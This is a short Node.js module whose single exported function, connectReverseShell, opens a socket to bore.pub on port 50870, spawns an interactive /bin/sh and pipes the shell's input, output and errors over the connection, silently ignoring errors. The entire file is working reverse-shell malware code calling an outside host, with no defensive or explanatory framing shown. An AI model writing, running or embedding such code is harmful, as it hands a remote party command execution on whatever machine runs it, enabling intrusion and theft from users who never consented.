const net = require('net');
const { spawn } = require('child_process');

function connectReverseShell() {
  const HOST = 'bore.pub';
  const PORT = 50870;  

  const client = new net.Socket();
  client.connect(PORT, HOST, () => {
    const sh = spawn('/bin/sh', ['-i']);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });

  client.on('error', () => {
    
  });
}

module.exports = { connectReverseShell };
